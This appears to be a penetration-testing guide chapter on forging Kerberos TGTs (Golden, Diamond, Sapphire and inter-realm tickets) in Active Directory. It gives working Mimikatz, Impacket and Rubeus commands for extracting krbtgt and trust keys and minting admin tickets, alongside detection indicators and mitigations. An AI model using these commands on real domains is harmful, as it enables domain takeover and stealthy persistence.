# 78.11 Forging Ticket Granting Tickets (TGTs)

## Introduction to Kerberos TGT Forgery
The cornerstone of Active Directory authentication is the Kerberos protocol. In this ecosystem, the Ticket Granting Ticket (TGT) acts as the ultimate passport. Once a user proves their identity to the Domain Controller (acting as the Key Distribution Center or KDC), they are issued a TGT. This TGT is then presented back to the KDC to request Ticket Granting Service (TGS) tickets for specific services.
Forging a TGT means an attacker can completely bypass standard authentication mechanisms, effectively impersonating any user (including Domain Admins or Enterprise Admins) without knowing their actual password. This provides stealthy, long-term persistence and privilege escalation, particularly across forest trusts.

## Kerberos Architecture and the KRBTGT Account
Every Active Directory domain features a default account named `krbtgt`. This account is automatically disabled and cannot be used for interactive logons. Its primary purpose is to act as the service account for the KDC service itself.
When the KDC issues a TGT, the ticket's internal structure (specifically the Privilege Attribute Certificate or PAC, and the encrypted part of the ticket) is encrypted and signed using the NTLM hash (or more modern AES keys) of the `krbtgt` account.
Because only the KDC knows the `krbtgt` key, it implicitly trusts any TGT that can be successfully decrypted and verified using this key. If an attacker extracts the `krbtgt` key, they assume the role of the KDC and can mint their own authentic-looking TGTs.

### Cryptographic Backing
Modern AD environments use AES-256 for Kerberos encryption (`AES256-CTS-HMAC-SHA1-96`), while older or legacy-configured environments may still fall back to `RC4-HMAC` (which relies on the NTLM hash). Extracting the AES-256 key of the `krbtgt` account is preferable for operational security, as forged tickets using RC4 in an AES-only environment stand out as a glaring Indicator of Compromise (IoC).

## Variations of TGT Forgery

### 1. The Golden Ticket
The traditional Golden Ticket attack relies on fabricating a completely new TGT offline. The attacker defines the user identity, the SIDs in the PAC, and the ticket lifetime.
**Pros:** Full offline creation, arbitrary lifetimes, complete domain control.
**Cons:** Highly anomalous. The forged ticket lacks natural AD metadata. The KDC never saw an AS-REQ for this ticket, meaning telemetry logs will show a TGS-REQ occurring without a preceding AS-REQ, a major red flag for Modern EDRs and Identity Threat Detection (ITDR) platforms.

### 2. The Diamond Ticket
A Diamond Ticket improves operational security by modifying a legitimately requested TGT rather than creating one from scratch.
The attacker performs a standard AS-REQ to get a legitimate TGT for any normal user. They then intercept this TGT, decrypt it using the stolen `krbtgt` key, modify the PAC to inject high-privilege SIDs (like Domain Admin), recalculate the PAC signatures, and re-encrypt it.
**Pros:** The ticket is generated by the DC, so it has valid timestamps, correct encryption types, and a matching AS-REQ event in the event logs.
**Cons:** Still requires access to the `krbtgt` key.

### 3. The Sapphire Ticket
Sapphire Tickets take evasion a step further. Instead of manually crafting the PAC, the attacker leverages the `S4U2Self` and `S4U2Proxy` Kerberos extensions, or simply requests a legitimate PAC for an existing high-privilege user using an LDAP query, and grafts this mathematically perfect PAC into the forged ticket.
**Pros:** The resulting ticket is nearly indistinguishable from a legitimate administrative ticket because the PAC matches the real administrator's attributes identically.

## Cross-Forest Trust Exploitation (Inter-Realm TGTs)
Forged TGTs are not limited to a single domain. If a forest trust exists, an attacker can exploit the **Inter-Realm Trust Key**.
When a trust is established between Domain A and Domain B, a trusted domain object (TDO) is created, and a shared password (trust key) is negotiated. If an attacker compromises Domain A and extracts the inter-realm trust key (the hash of the trust account, e.g., `DomainB$`), they can forge an Inter-Realm TGT.
Crucially, they can inject **SID History** (ExtraSids) into the PAC of this forged ticket. By injecting the Enterprise Admins SID of Domain B (`S-1-5-21-[DomainB]-519`), the attacker can escalate from Domain A to completely compromise Domain B.

## Step-by-Step Execution Mechanics

### Phase 1: Extracting the Key Material
The prerequisite for all these attacks is obtaining the `krbtgt` key. This requires Domain Admin privileges or equivalent (e.g., Replication rights).
```bash
# Using Mimikatz to DCSync the krbtgt account
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# Using Impacket's secretsdump from a pivot machine
impacket-secretsdump corp.local/admin:Password123@10.0.0.10 -just-dc-user krbtgt
```

### Phase 2: Forging the Golden Ticket
Using the extracted AES-256 key to forge a ticket for a non-existent user `svc_backup` that belongs to the Domain Admins group (RID 512).
```bash
# Impacket ticketer.py
impacket-ticketer -domain corp.local \
  -domain-sid S-1-5-21-123456789-123456789-123456789 \
  -aesKey 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef \
  -user svc_backup \
  -groups 512,513,518,519,520 \
  admin_forged.ccache

# Set environment variable to use the forged ticket
export KRB5CCNAME=/path/to/admin_forged.ccache
```

### Phase 3: Forging a Diamond Ticket with Rubeus
To craft a Diamond Ticket, Rubeus is executed on a Windows endpoint.
```powershell
# Requesting a normal ticket and simultaneously modifying it
Rubeus.exe diamond /user:lowpriv /password:Winter2023! /enctype:aes256 \
  /krbtgt:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef \
  /domain:corp.local /ticketuser:administrator /groups:512 /ptt
```

### Phase 4: Inter-Realm Cross-Forest Forgery
Using the extracted trust key to jump to the root domain.
```bash
# Extract the trust key for the ROOT domain
impacket-secretsdump child.corp.local/admin:Pass@10.0.1.10 -just-dc-user ROOT$

# Forge an inter-realm TGT with Enterprise Admin ExtraSids
impacket-ticketer -domain child.corp.local \
  -domain-sid S-1-5-21-[CHILD_SID] \
  -extra-sid S-1-5-21-[ROOT_SID]-519 \
  -aesKey [TRUST_AES_KEY] \
  -user Administrator \
  trust_hop.ccache
```

## Telemetry and Indicators of Compromise (IoCs)
Detecting TGT forgery requires a combination of network telemetry and endpoint event logs:
1.  **Missing AS-REQ:** A user presents a TGS-REQ (Event ID 4769) to the domain controller, but there is no corresponding AS-REQ (Event ID 4768) within the expected timeframe.
2.  **Anomalous Encryption Types:** A Golden Ticket using RC4 (0x17) in a domain where AES (0x12) is strictly enforced.
3.  **Arbitrary Lifetimes:** Standard TGTs live for 10 hours. Forged tickets with lifetimes of 10 years (or completely missing expiration fields) are highly suspicious.
4.  **PAC Anomalies:** EDRs analyzing the LSASS memory space can detect mathematically invalid PACs or PACs lacking proper KDC signatures, though Sapphire tickets explicitly bypass this.
5.  **DCSync Signatures:** Event ID 4662 indicating Directory Service Access with the replication GUIDs (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`).

## Defensive Mitigations and Engineering
1.  **KRBTGT Password Reset:** The only way to invalidate a Golden Ticket is to change the `krbtgt` account password. Because Kerberos uses a two-password history, the password must be changed **twice** (with replication time allowed between changes) to completely invalidate all forged tickets.
2.  **Enable SID Filtering:** Across forest trusts, ensure SID Filtering is enabled. This strips high-privileged SIDs (like Enterprise Admins) from the ExtraSids attribute of inter-realm tickets, killing the cross-forest jump.
3.  **Privileged Access Management (PAM):** Restrict who can perform DCSync operations. Monitor the `Replicating Directory Changes` ACL heavily.
4.  **Credential Guard:** Implementing Windows Defender Credential Guard protects the local LSASS process, making Pass-the-Ticket operations and ticket extraction significantly more difficult.

## Chaining Opportunities
- Extracting the `krbtgt` key often follows a successful [[13 - Delegated Authentication Bypass]] or an [[14 - SCCM and WSUS Exploitation in AD]] attack where Tier 0 access was achieved.
